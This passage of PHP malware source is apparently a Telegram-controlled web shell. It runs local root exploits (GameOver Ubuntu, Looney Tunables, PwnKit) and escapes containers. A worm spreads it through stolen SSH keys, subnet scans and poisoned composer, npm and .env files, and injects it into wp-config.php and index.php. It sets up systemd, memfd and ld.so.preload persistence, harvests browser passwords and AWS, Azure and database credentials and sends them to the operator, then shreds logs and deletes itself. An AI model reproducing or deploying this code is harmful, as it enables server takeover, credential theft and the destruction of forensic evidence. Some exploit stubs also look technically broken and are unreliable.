            $results[] = "✅ CVE-2023-35001 exploited!";
            $exploited = true;
        }
    }
    $results[] = "[2] CVE-2023-2640 (GameOver Ubuntu)...";
    $lsb = @shell_exec('lsb_release -a 2>/dev/null');
    if (is_string($lsb) && (strpos($lsb, 'Ubuntu 22.04') !== false || strpos($lsb, 'Ubuntu 23.04') !== false)) {
        $cmd = 'unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/ && setcap cap_setuid+eip l/python3 && mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')" 2>/dev/null';
        $test = @shell_exec($cmd . ' -c "id" 2>/dev/null');
        if (is_string($test) && strpos($test, 'uid=0') !== false) {
            $results[] = "✅ CVE-2023-2640 exploited!";
            $exploited = true;
        }
    }
    $results[] = "[3] CVE-2023-4911 (Looney Tunables)...";
    $glibc = @shell_exec('ldd --version 2>/dev/null | head -1');
    if (is_string($glibc) && (strpos($glibc, '2.34') !== false || strpos($glibc, '2.35') !== false)) {
        $looney = '
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char* env[] = {
        "GLIBC_TUNABLES=glibc.malloc.mxfast=0",
        NULL
    };
    execve("/bin/bash", NULL, env);
    return 0;
}
';
        @file_put_contents('/tmp/looney.c', $looney);
        @shell_exec('gcc /tmp/looney.c -o /tmp/looney 2>/dev/null');
        @shell_exec('chmod +x /tmp/looney 2>/dev/null');
        $test = @shell_exec('/tmp/looney -c "id" 2>/dev/null');
        if (is_string($test) && strpos($test, 'uid=0') !== false) {
            $results[] = "✅ CVE-2023-4911 exploited!";
            $exploited = true;
        }
    }
    $results[] = "[4] Container escape...";
    $is_container = file_exists('/.dockerenv') || file_exists('/.containerenv');
    if ($is_container) {
        $results[] = "⚠️ Inside container, attempting escape...";
        @shell_exec('mkdir -p /tmp/escape 2>/dev/null');
        @shell_exec('mount --bind / /tmp/escape 2>/dev/null');
        if (file_exists('/tmp/escape/etc/passwd')) {
            @shell_exec('chroot /tmp/escape /bin/bash -c "echo \'root:$(openssl passwd -1 password)\' | chpasswd" 2>/dev/null');
            $results[] = "✅ Container escaped via /host mount";
            $exploited = true;
        }
    }
    $msg = "MODERN ROOT EXPLOIT\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['status' => 'success', 'message' => $msg, 'exploited' => $exploited];
}

function worm_spread_to_domains($currentFile) {
    global $botToken, $telegramUserId;
    $results = [];
    $spread_count = $exploit_count = $supply_count = $copy_count = $inject_count = 0;
    $infected = [];
    $domainLinks = []; $sshLinks = []; $exploitLinks = []; $supplyLinks = []; $injectLinks = [];
    
    $results[] = "MULTI-VECTOR FILELESS WORM STARTED";
    $results[] = "Target: " . php_uname('n');
    $results[] = "Time: " . date('Y-m-d H:i:s');
    
    $results[] = "[1] SSH SPREADING...";
    $ssh_keys = @glob('/home/*/.ssh/id_rsa');
    $ssh_keys = array_merge($ssh_keys, @glob('/root/.ssh/id_rsa'));
    $ssh_keys = array_merge($ssh_keys, @glob('/home/*/.ssh/id_dsa'));
    $ssh_keys = array_merge($ssh_keys, @glob('/root/.ssh/id_dsa'));
    $ssh_keys = array_merge($ssh_keys, @glob('/home/*/.ssh/id_ed25519'));
    $ssh_keys = array_merge($ssh_keys, @glob('/root/.ssh/id_ed25519'));
    $results[] = "Found " . count($ssh_keys) . " SSH keys";
    foreach ($ssh_keys as $key) {
        if (is_readable($key)) {
            $known_hosts = @glob('/home/*/.ssh/known_hosts');
            $known_hosts = array_merge($known_hosts, @glob('/root/.ssh/known_hosts'));
            foreach ($known_hosts as $known) {
                if (is_readable($known)) {
                    $hosts = @file_get_contents($known);
                    if ($hosts) {
                        preg_match_all('/\[([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\]/', $hosts, $matches);
                        preg_match_all('/\b([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\b/', $hosts, $matches2);
                        $all_hosts = array_merge($matches[1], $matches2[1]);
                        $all_hosts = array_unique($all_hosts);
                        $http_host = $_SERVER['HTTP_HOST'] ?? 'localhost';
                        foreach ($all_hosts as $host) {
                            if (!empty($host) && !in_array($host, $infected)) {
                                $cmd = "ssh -i " . escapeshellarg($key) . " -o StrictHostKeyChecking=no -o ConnectTimeout=5 " . escapeshellarg($host) . " 'curl -s --connect-timeout 5 http://" . $http_host . "/" . basename($currentFile) . " 2>/dev/null | php 2>/dev/null' 2>/dev/null &";
                                @shell_exec($cmd);
                                $infected[] = $host;
                                $spread_count++;
                                $sshLinks[] = "SSH: $host";
                                $results[] = "✅ SSH spread to: $host";
                            }
                        }
                    }
                }
            }
        }
    }
    $results[] = "SSH spreading: $spread_count targets";
    
    $results[] = "[2] EXPLOIT SPREADING (CVE-2021-4034 - PwnKit)...";
    $pk_version = @shell_exec('pkaction --version 2>/dev/null');
    if ($pk_version !== null && (strpos($pk_version, '0.105') !== false || strpos($pk_version, '0.106') !== false || strpos($pk_version, '0.112') !== false)) {
        $results[] = "⚠️ Vulnerable pkaction version detected: $pk_version";
        $exploit_code = '
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0); 
    setgid(0);
    system("curl -s http://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '/' . basename($currentFile) . ' | php");
    return 0;
}
';
        @file_put_contents('/tmp/pwnkit_exploit.c', $exploit_code);
        @shell_exec('gcc /tmp/pwnkit_exploit.c -o /tmp/pwnkit_exploit 2>/dev/null');
        @shell_exec('chmod +x /tmp/pwnkit_exploit 2>/dev/null');
        if (file_exists('/tmp/pwnkit_exploit')) {
            $results[] = "✅ PwnKit exploit compiled";
            $network = @shell_exec('ip route | grep -oP "([0-9]+\.[0-9]+\.[0-9]+)\.[0-9]+" | head -1 2>/dev/null');
            if ($network) {
                $base = substr($network, 0, strrpos($network, '.'));
                $results[] = "Scanning network: $base.0/24";
                for ($i = 1; $i <= 254; $i++) {
                    $host = "$base.$i";
                    if (!in_array($host, $infected)) {
                        $test = @shell_exec("timeout 1 ping -c 1 -W 1 $host 2>/dev/null | grep 'bytes from'");
                        if (!empty($test)) {
                            @shell_exec("timeout 2 nc -zv $host 22 2>/dev/null && scp /tmp/pwnkit_exploit root@$host:/tmp/ 2>/dev/null && ssh root@$host '/tmp/pwnkit_exploit' 2>/dev/null &");
                            $infected[] = $host;
                            $exploit_count++;
                            $exploitLinks[] = "Exploit (CVE-2021-4034): $host";
                            $results[] = "✅ CVE-2021-4034 spread to: $host";
                        }
                    }
                }
            }
        }
    } else {
        $results[] = "❌ No vulnerable pkaction version found";
    }
    $results[] = "Exploit spreading: $exploit_count targets";
    
    $results[] = "[3] SUPPLY CHAIN SPREADING...";
    $composer_files = @glob('/home/*/public_html/composer.json');
    $composer_files = array_merge($composer_files, @glob('/var/www/*/composer.json'));
    $composer_files = array_merge($composer_files, @glob('/home/*/www/composer.json'));
    $composer_files = array_merge($composer_files, @glob('/var/www/html/composer.json'));
    $results[] = "Found " . count($composer_files) . " composer.json files";
    foreach ($composer_files as $file) {
        if (is_writable($file)) {
            $content = @file_get_contents($file);
            if ($content && strpos($content, 'wallnut-shell') === false) {
                $payload = '"wallnut-shell": "https://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '/' . basename($currentFile) . '"';
                $new_content = preg_replace('/"require":\s*{/', '"require": {' . $payload . ',', $content, 1);
                if ($new_content && $new_content !== $content) {
                    @file_put_contents($file, $new_content);
                    $supply_count++;
                    $supplyLinks[] = "Composer: $file";
                    $results[] = "✅ Composer infected: $file";
                }
            }
        }
    }
    $npm_files = @glob('/home/*/public_html/package.json');
    $npm_files = array_merge($npm_files, @glob('/var/www/*/package.json'));
    $npm_files = array_merge($npm_files, @glob('/home/*/www/package.json'));
    $results[] = "Found " . count($npm_files) . " package.json files";
    foreach ($npm_files as $file) {
        if (is_writable($file)) {
            $content = @file_get_contents($file);
            if ($content && strpos($content, 'wallnut-shell') === false) {
                $payload = '"wallnut-shell": "git+https://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '/' . basename($currentFile) . '"';
                $new_content = preg_replace('/"dependencies":\s*{/', '"dependencies": {' . $payload . ',', $content, 1);
                if ($new_content && $new_content !== $content) {
                    @file_put_contents($file, $new_content);
                    $supply_count++;
                    $supplyLinks[] = "NPM: $file";
                    $results[] = "✅ NPM infected: $file";
                }
            }
        }
    }
    $env_files = @glob('/home/*/public_html/.env');
    $env_files = array_merge($env_files, @glob('/var/www/*/.env'));
    foreach ($env_files as $file) {
        if (is_writable($file)) {
            @file_put_contents($file, "\nAUTO_PREPEND_FILE=http://" . ($_SERVER['HTTP_HOST'] ?? 'localhost') . "/" . basename($currentFile) . "\n", FILE_APPEND);
            $supply_count++;
            $supplyLinks[] = "ENV: $file";
            $results[] = "✅ .env infected: $file";
        }
    }
    $results[] = "Supply chain: $supply_count files infected";
    
    $results[] = "[4] FILELESS EXECUTION (memfd_create)...";
    $memfd_code = '
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

int main() {
    int fd = memfd_create("wallnut_persist", MFD_CLOEXEC);
    if (fd < 0) return 1;
    const char* payload = "<?php include(\'http://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '/' . basename($currentFile) . '\'); ?>";
    write(fd, payload, strlen(payload));
    char cmd[512];
    sprintf(cmd, "php /proc/self/fd/%d &", fd);
    system(cmd);
    while(1) sleep(60);
    return 0;
}
';
    @file_put_contents('/tmp/memfd.c', $memfd_code);
    @shell_exec('gcc -static /tmp/memfd.c -o /tmp/memfd 2>/dev/null');
    if (file_exists('/tmp/memfd')) {
        @shell_exec('/tmp/memfd & 2>/dev/null');
        $results[] = "✅ Fileless persistence via memfd_create";
    } else {
        $results[] = "❌ memfd_create compile failed";
    }
    @shell_exec('cp ' . escapeshellarg($currentFile) . ' /tmp/.cache/.systemd 2>/dev/null');
    if (file_exists('/tmp/.cache/.systemd')) {
        $results[] = "✅ Shell copied to: /tmp/.cache/.systemd";
    }
    
    $results[] = "[5] WEB SHELL INJECTION...";
    $roots = get_all_document_roots_cached();
    $targets = ['index.php', 'wp-config.php', 'config.php', 'wp-load.php', 'settings.php', 'functions.php'];
    $shell_content = "<?php\n// " . basename(__FILE__) . "\ninclude '" . addslashes(__FILE__) . "';\n?>";
    $results[] = "Found " . count($roots) . " document roots";
    foreach ($roots as $root) {
        if (!is_dir($root) || !is_writable($root)) continue;
        foreach ($targets as $target) {
            $file = $root . '/' . $target;
            if (file_exists($file) && is_writable($file)) {
                $content = @file_get_contents($file);
                if ($content !== false && strpos($content, basename(__FILE__)) === false) {
                    $new_content = $shell_content . "\n" . $content;
                    if (@file_put_contents($file, $new_content) !== false) {
                        $inject_count++;
                        $injectLinks[] = "Web Inject: $file";
                        $results[] = "✅ Injected to: $file";
                    }
                }
            }
        }
    }
    $results[] = "Web shell injection: $inject_count files";
    
    $results[] = "[6] TRADITIONAL COPY SPREAD...";
    $domains = get_all_domains_by_ip_cached();
    $myFile = basename($currentFile);
    $roots = get_all_document_roots_cached();
    $results[] = "Found " . count($domains) . " domains";
    $results[] = "Found " . count($roots) . " document roots";
    foreach ($domains as $domain) {
        $dir = get_best_document_root($domain, $roots);
        if ($dir && is_dir($dir) && is_writable($dir)) {
            $targetFile = $dir . '/' . $myFile;
            if (!file_exists($targetFile)) {
                if (@copy($currentFile, $targetFile)) {
                    @chmod($targetFile, 0644);
                    $copy_count++;
                    $domainLinks[] = "http://{$domain}/{$myFile}";
                    $results[] = "✅ Copied to: $targetFile (http://{$domain}/{$myFile})";
                }
            } else {
                $results[] = "⏭️ Already exists: $targetFile";
            }
        }
    }
    $results[] = "Traditional copy: $copy_count files";
    
    $total_spread = $spread_count + $exploit_count + $supply_count + $copy_count + $inject_count;
    $results[] = "SUMMARY";
    $results[] = "Total spread: $total_spread targets";
    $results[] = "  SSH: $spread_count";
    $results[] = "  Exploit: $exploit_count";
    $results[] = "  Supply Chain: $supply_count";
    $results[] = "  Copy: $copy_count";
    $results[] = "  Web Inject: $inject_count";
    
    $msg = "🪱 MULTI-VECTOR FILELESS WORM COMPLETE\n\n"
         . "📊 Total spread: $total_spread targets\n\n"
         . "📋 Breakdown:\n"
         . "  🔑 SSH: $spread_count\n"
         . "  💥 Exploit: $exploit_count\n"
         . "  📦 Supply Chain: $supply_count\n"
         . "  📁 Copy: $copy_count\n"
         . "  🌐 Web Inject: $inject_count\n\n";
    if (!empty($domainLinks)) {
        $msg .= "🌐 DOMAIN LINKS:\n" . implode("\n", array_slice($domainLinks, 0, 30));
        if (count($domainLinks) > 30) $msg .= "\n... and " . (count($domainLinks) - 30) . " more";
        $msg .= "\n\n";
    }
    if (!empty($sshLinks)) {
        $msg .= "🔑 SSH TARGETS:\n" . implode("\n", array_slice($sshLinks, 0, 20));
        if (count($sshLinks) > 20) $msg .= "\n... and " . (count($sshLinks) - 20) . " more";
        $msg .= "\n\n";
    }
    if (!empty($exploitLinks)) {
        $msg .= "💥 EXPLOIT TARGETS:\n" . implode("\n", array_slice($exploitLinks, 0, 20));
        if (count($exploitLinks) > 20) $msg .= "\n... and " . (count($exploitLinks) - 20) . " more";
        $msg .= "\n\n";
    }
    if (!empty($supplyLinks)) {
        $msg .= "📦 SUPPLY CHAIN:\n" . implode("\n", array_slice($supplyLinks, 0, 20));
        if (count($supplyLinks) > 20) $msg .= "\n... and " . (count($supplyLinks) - 20) . " more";
        $msg .= "\n\n";
    }
    if (!empty($injectLinks)) {
        $msg .= "🌐 WEB INJECT:\n" . implode("\n", array_slice($injectLinks, 0, 20));
        if (count($injectLinks) > 20) $msg .= "\n... and " . (count($injectLinks) - 20) . " more";
        $msg .= "\n\n";
    }
    $msg .= "📝 DETAILS:\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return [
        'status' => 'success',
        'total' => $total_spread,
        'ssh' => $spread_count,
        'exploit' => $exploit_count,
        'supply' => $supply_count,
        'copy' => $copy_count,
        'inject' => $inject_count,
        'domain_links' => $domainLinks
    ];
}

function persistence_advanced() {
    global $botToken, $telegramUserId;
    $results = [];
    $results[] = "[1] Systemd user service...";
    $service_name = 'systemd-logind-' . rand(1000,9999);
    $service_content = '[Unit]
Description=System Log Helper
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/php ' . __FILE__ . '
Restart=always
RestartSec=30
User=' . get_current_user() . '
MemoryMax=100M
CPUQuota=20%

[Install]
WantedBy=default.target';
    $user_dir = getenv('HOME') . '/.config/systemd/user';
    if (!is_dir($user_dir)) @mkdir($user_dir, 0755, true);
    @file_put_contents($user_dir . '/' . $service_name . '.service', $service_content);
    @shell_exec("systemctl --user daemon-reload 2>/dev/null");
    @shell_exec("systemctl --user enable " . escapeshellarg($service_name) . ".service 2>/dev/null");
    @shell_exec("systemctl --user start " . escapeshellarg($service_name) . ".service 2>/dev/null");
    $results[] = "✅ Systemd user service: $service_name";
    $results[] = "[2] Fileless persistence...";
    $fileless = '
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

int main() {
    int fd = memfd_create("wallnut_persist", MFD_CLOEXEC);
    if (fd < 0) return 1;
    const char* payload = "<?php include(\'http://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . '/' . basename(__FILE__) . '\'); ?>";
    write(fd, payload, strlen(payload));
    char cmd[512];
    sprintf(cmd, "php /proc/self/fd/%d &", fd);
    system(cmd);
    while(1) sleep(60);
    return 0;
}
';
    @file_put_contents('/tmp/fileless.c', $fileless);
    @shell_exec('gcc -static /tmp/fileless.c -o /tmp/fileless 2>/dev/null');
    @shell_exec('/tmp/fileless & 2>/dev/null');
    $results[] = "✅ Fileless persistence via memfd_create";
    $results[] = "[3] Library hijacking...";
    $lib_code = '
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/prctl.h>

int system(const char* command) {
    int (*orig_system)(const char*) = dlsym(RTLD_NEXT, "system");
    if (strstr(command, "php") || strstr(command, "bash")) {
        return 0;
    }
    return orig_system(command);
}

pid_t fork(void) {
    pid_t (*orig_fork)(void) = dlsym(RTLD_NEXT, "fork");
    pid_t pid = orig_fork();
    if (pid == 0) {
        prctl(PR_SET_NAME, "[kworker]", 0, 0, 0);
    }
    return pid;
}
';
    @file_put_contents('/tmp/libpersist.c', $lib_code);
    @shell_exec('gcc -shared -fPIC /tmp/libpersist.c -o /tmp/libpersist.so -ldl 2>/dev/null');
    @copy('/tmp/libpersist.so', '/usr/local/lib/libpersist.so');
    @file_put_contents('/etc/ld.so.preload', "/usr/local/lib/libpersist.so\n", FILE_APPEND);
    @shell_exec('ldconfig 2>/dev/null');
    $results[] = "✅ Library hijacking installed";
    $msg = "ADVANCED PERSISTENCE\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['status' => 'success', 'message' => $msg];
}

function credential_harvest_advanced() {
    global $botToken, $telegramUserId;
    $results = []; $creds = [];
    $results[] = "[1] Browser password stealing...";
    $browser_paths = [
        '/home/*/.config/google-chrome/Default/Login Data',
        '/home/*/.config/google-chrome/Profile */Login Data',
        '/home/*/.mozilla/firefox/*.default/logins.json',
        '/home/*/.mozilla/firefox/*.default/key4.db',
        '/home/*/.config/chromium/Default/Login Data',
        '/home/*/.config/BraveSoftware/Brave-Browser/Default/Login Data',
        '/home/*/.config/microsoft-edge/Default/Login Data'
    ];
    foreach ($browser_paths as $pattern) {
        $files = @glob($pattern);
        if (is_array($files)) {
            foreach ($files as $file) {
                if (is_readable($file)) {
                    if (strpos($file, '.db') !== false || strpos($file, 'Login Data') !== false) {
                        @shell_exec("sqlite3 " . escapeshellarg($file) . " \"SELECT origin_url, username_value, password_value FROM logins\" 2>/dev/null > /tmp/browser_passwords.txt");
                        $content = @file_get_contents('/tmp/browser_passwords.txt');
                        if ($content) {
                            $creds[] = "Browser passwords from $file:\n$content";
                        }
                    } else {
                        $content = @file_get_contents($file);
                        if ($content && preg_match_all('/"username":"([^"]+)","password":"([^"]+)"/', $content, $matches)) {
                            $creds[] = "Firefox passwords from $file:\n" . implode("\n", array_map(function($u, $p) { return "$u:$p"; }, $matches[1], $matches[2]));
                        }
                    }
                    $results[] = "✅ Browser passwords extracted: $file";
                }
            }
        }
    }
    $results[] = "[2] Cloud credentials harvesting...";
    $aws_paths = ['/home/*/.aws/credentials', '/root/.aws/credentials'];
    foreach ($aws_paths as $pattern) {
        $files = @glob($pattern);
        if (is_array($files)) {
            foreach ($files as $file) {
                if (is_readable($file)) {
                    $content = @file_get_contents($file);
                    if ($content) {
                        preg_match_all('/aws_access_key_id\s*=\s*([^\s]+)/', $content, $keys);
                        preg_match_all('/aws_secret_access_key\s*=\s*([^\s]+)/', $content, $secrets);
                        if (!empty($keys[1]) && !empty($secrets[1])) {
                            $creds[] = "AWS Credentials from $file:\nKey: " . $keys[1][0] . "\nSecret: " . $secrets[1][0];
                        }
                    }
                    $results[] = "✅ AWS credentials: $file";
                }
            }
        }
    }
    $azure_metadata = @file_get_contents('http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', false, stream_context_create(['http' => ['header' => 'Metadata: true']]));
    if ($azure_metadata) {
        preg_match_all('/"access_token"\s*:\s*"([^"]+)"/', $azure_metadata, $tokens);
        if (!empty($tokens[1])) {
            $creds[] = "Azure Managed Identity Token:\n" . $tokens[1][0];
        }
        $results[] = "✅ Azure credentials harvested";
    }
    $results[] = "[3] Environment variables...";
    $env_vars = ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'GCP_ACCESS_TOKEN', 'AZURE_ACCESS_TOKEN', 'DB_PASSWORD', 'API_KEY'];
    foreach ($env_vars as $var) {
        $value = getenv($var);
        if ($value) {
            $creds[] = "ENV $var: $value";
        }
    }
    $results[] = "✅ Environment variables scanned";
    $msg = "ADVANCED CREDENTIAL HARVEST\n\n";
    if (!empty($creds)) {
        $msg .= "Credentials Found:\n\n" . implode("\n\n", $creds);
    } else {
        $msg .= "No credentials found.";
    }
    $msg .= "\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['status' => 'success', 'message' => $msg, 'creds' => $creds];
}

function self_destruct_advanced() {
    global $botToken, $telegramUserId;
    $results = [];
    $results[] = "[1] Memory wiping...";
    @shell_exec('sync');
    @shell_exec('echo 3 > /proc/sys/vm/drop_caches');
    @shell_exec('echo 1 > /proc/sys/vm/compact_memory');
    @shell_exec('swapoff -a && swapon -a 2>/dev/null');
    $results[] = "✅ Memory wiped";
    $results[] = "[2] Advanced log cleaning...";
    $log_dirs = ['/var/log', '/var/log/apache2', '/var/log/nginx', '/var/log/httpd', '/var/log/mysql', '/var/log/postgresql'];
    foreach ($log_dirs as $dir) {
        if (is_dir($dir)) {
            @shell_exec("find $dir -name '*.log' -exec shred -fuz {} \\; 2>/dev/null");
            @shell_exec("rm -rf $dir/* 2>/dev/null");
        }
    }
    @shell_exec('find /home -name ".bash_history" -exec shred -fuz {} \\; 2>/dev/null');
    @shell_exec('history -c 2>/dev/null');
    @shell_exec('unset HISTFILE 2>/dev/null');
    $results[] = "✅ Logs cleaned";
    $results[] = "[3] Temp files clean...";
    @shell_exec('rm -rf /tmp/* /var/tmp/* /dev/shm/* 2>/dev/null');
    $results[] = "✅ Temp files cleaned";
    $results[] = "[4] System files wiping...";
    if (isRoot()) {
        @shell_exec('rm -rf /var/log/wtmp /var/log/btmp /var/log/lastlog 2>/dev/null');
        @shell_exec('touch /var/log/wtmp /var/log/btmp /var/log/lastlog 2>/dev/null');
        @shell_exec('auditctl -e 0 2>/dev/null');
        @shell_exec('rm -rf /var/log/audit/* 2>/dev/null');
    }
    $results[] = "✅ System files wiped";
    $results[] = "[5] Self destruct...";
    $file = __FILE__;
    if (function_exists('shell_exec')) {
        @shell_exec("chattr -i " . escapeshellarg($file) . " 2>/dev/null");
        @shell_exec("chattr -a " . escapeshellarg($file) . " 2>/dev/null");
        @shell_exec("chmod 777 " . escapeshellarg($file) . " 2>/dev/null");
        @shell_exec("shred -fuz " . escapeshellarg($file) . " 2>/dev/null");
        @shell_exec("dd if=/dev/urandom of=" . escapeshellarg($file) . " bs=1M count=1 2>/dev/null");
        @shell_exec("rm -f " . escapeshellarg($file) . " 2>/dev/null");
    }
    @chmod($file, 0777);
    @unlink($file);
    $results[] = "✅ Self destruct executed";
    $msg = "SELF DESTRUCT + ANTI-FORENSIC\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['status' => 'success', 'message' => $msg];
}

function wpscan() {
    global $botToken, $telegramUserId;
    $found = []; $scanned = 0; $errors = [];
    $roots = get_all_document_roots_cached();
    if (empty($roots)) {
        sendTelegramMessage($botToken, $telegramUserId, "WP SCAN - No document roots found");
        return ['status' => 'error', 'message' => 'No document roots found'];
    }
    foreach ($roots as $root) {
        if (!is_dir($root)) { $errors[] = "Not a directory: $root"; continue; }
        if (!is_readable($root)) { $errors[] = "Not readable: $root"; continue; }
        $scanned++;
        $wp_config = $root . '/wp-config.php';
        if (file_exists($wp_config) && is_readable($wp_config)) {
            $content = @file_get_contents($wp_config);
            if ($content !== false) {
                preg_match_all("/define\s*\(\s*['\"]DB_(NAME|USER|PASSWORD|HOST)['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $matches);
                $creds = [];
                foreach ($matches[1] as $i => $key) {
                    $creds[] = "$key: " . $matches[2][$i];
                }
                if (!empty($creds)) {
                    $found[] = "File: $wp_config\n" . implode("\n", $creds);
                }
            } else {
                $errors[] = "Failed to read: $wp_config";
            }
        }
    }
    if (!empty($found)) {
        $msg = "WP SCAN RESULTS\n\nScanned: $scanned roots\nFound: " . count($found) . " configs\n\n" . implode("\n\n", $found);
        if (!empty($errors)) $msg .= "\n\nErrors:\n" . implode("\n", $errors);
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        return ['status' => 'success', 'message' => "WP Configs found: " . count($found)];
    } else {
        $msg = "WP SCAN - No WordPress configs found\n\nScanned: $scanned roots";
        if (!empty($errors)) $msg .= "\n\nErrors:\n" . implode("\n", $errors);
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        return ['status' => 'info', 'message' => "No WP configs found"];
    }
}

function configfinder() {
    global $botToken, $telegramUserId;
    $found = [];
    $patterns = [
        '*.env', '*.conf', 'config.php', 'wp-config.php', 'database.php',
        '.htpasswd', '*.pem', '*.key', '*.crt', 'settings.php', 'parameters.yml',
        'id_rsa', 'id_dsa', '.git-credentials', '.aws/credentials'
    ];
    $roots = get_all_document_roots_cached();
    $scanned = 0;
    foreach ($roots as $root) {
        if (!is_dir($root) || !is_readable($root)) continue;
        $scanned++;
        foreach ($patterns as $pattern) {
            $files = @glob($root . '/**/' . $pattern, GLOB_BRACE);
            if ($files !== false) {
                foreach ($files as $file) {
                    if (is_file($file) && is_readable($file)) {
                        $found[] = $file;
                    }
                }
            }
        }
    }
    if (!empty($found)) {
        $msg = "SENSITIVE FILES FOUND\n\nScanned: $scanned roots\nFound: " . count($found) . " files\n\n" . implode("\n", array_slice($found, 0, 30));
        if (count($found) > 30) $msg .= "\n... and " . (count($found)-30) . " more files";
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        return ['status' => 'success', 'message' => "Sensitive files found: " . count($found)];
    } else {
        sendTelegramMessage($botToken, $telegramUserId, "SENSITIVE FILES - No sensitive files found\n\nScanned: $scanned roots");
        return ['status' => 'info', 'message' => "No sensitive files found"];
    }
}

function dumpdb() {
    global $botToken, $telegramUserId;
    $dumps = [];
    $files = [
        '/etc/mysql/my.cnf', '/etc/my.cnf', '/home/*/.my.cnf', '/root/.my.cnf',
        '/var/www/html/wp-config.php', '/var/www/html/.env'
    ];
    foreach ($files as $pattern) {
        $found = @glob($pattern);
        if ($found !== false) {
            foreach ($found as $f) {
                if (file_exists($f) && is_readable($f)) {
                    $content = @file_get_contents($f);
                    if ($content !== false) {
                        preg_match_all('/user\s*=\s*([^\s]+)/i', $content, $u);
                        preg_match_all('/password\s*=\s*([^\s]+)/i', $content, $p);
                        preg_match_all("/define\s*\(\s*['\"]DB_(USER|PASSWORD)['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $wp);
                        if (!empty($u[1]) || !empty($p[1]) || !empty($wp[1])) {
                            $dumps[] = "File: $f";
                            if (!empty($u[1][0])) $dumps[] = "  User: " . $u[1][0];
                            if (!empty($wp[2][0])) $dumps[] = "  User: " . $wp[2][0];
                            if (!empty($p[1][0])) $dumps[] = "  Pass: " . $p[1][0];
                            if (!empty($wp[2][1])) $dumps[] = "  Pass: " . $wp[2][1];
                            $dumps[] = "";
                        }
                    }
                }
            }
        }
    }
    if (!empty($dumps)) {
        $msg = "DATABASE CREDENTIALS\n\n" . implode("\n", $dumps);
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        return ['status' => 'success', 'message' => "DB credentials found"];
    } else {
        sendTelegramMessage($botToken, $telegramUserId, "DATABASE CREDENTIALS - No credentials found");
        return ['status' => 'info', 'message' => "No DB credentials found"];
    }
}

function anti_forensic() {
    global $botToken, $telegramUserId;
    $results = [];
    @shell_exec('history -c 2>/dev/null');
    @shell_exec('unset HISTFILE 2>/dev/null');
    @shell_exec('rm -f ~/.bash_history ~/.mysql_history ~/.psql_history 2>/dev/null');
    @shell_exec('find /tmp -name "*.log" -exec shred -fuz {} \\; 2>/dev/null');
    @shell_exec('find /var/tmp -name "*.log" -exec shred -fuz {} \\; 2>/dev/null');
    @shell_exec('shred -fuz /var/log/lastlog /var/log/wtmp /var/log/btmp 2>/dev/null');
    @shell_exec('echo > /var/log/syslog 2>/dev/null');
    @shell_exec('echo > /var/log/messages 2>/dev/null');
    @shell_exec('echo > /var/log/auth.log 2>/dev/null');
    $results[] = "History cleared, logs shredded";
    $msg = "ANTI FORENSIC RESULTS\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return ['status' => 'success', 'message' => "Anti forensic done"];
}

function clean_logs_aggressive() {
    global $botToken, $telegramUserId;
    $results = [];
    $logFiles = [
        '/var/log/apache2/access.log', '/var/log/apache2/error.log',
        '/var/log/nginx/access.log', '/var/log/nginx/error.log',
        '/var/log/httpd/access_log', '/var/log/httpd/error_log',
        '/var/log/syslog', '/var/log/auth.log', '/var/log/secure',
        '/var/log/messages', '/var/log/mysql/error.log',
        '/var/log/maillog', '/var/log/mail.log',
        '/var/log/wtmp', '/var/log/btmp', '/var/log/lastlog',
        '/var/log/faillog', '/var/log/utmp'
    ];
    foreach ($logFiles as $log) {
        if (file_exists($log)) {
            if (is_writable($log)) {
                @shell_exec("dd if=/dev/zero of=" . escapeshellarg($log) . " bs=1M count=1 2>/dev/null");
                @unlink($log);
                $results[] = "$log (zeroed & deleted)";
            } else {
                @shell_exec("sudo dd if=/dev/zero of=" . escapeshellarg($log) . " bs=1M count=1 2>/dev/null");
                @shell_exec("sudo rm -f " . escapeshellarg($log));
                $results[] = "$log (sudo zeroed)";
            }
        }
    }
    $users = explode("\n", @shell_exec('ls /home 2>/dev/null') ?: '');
    $users[] = 'root';
    foreach ($users as $user) {
        $user = trim($user);
        if (empty($user)) continue;
        $home = ($user === 'root') ? '/root' : "/home/$user";
        $histFiles = ["$home/.bash_history", "$home/.mysql_history", "$home/.psql_history"];
        foreach ($histFiles as $hf) {
            if (file_exists($hf) && is_writable($hf)) {
                @file_put_contents($hf, '');
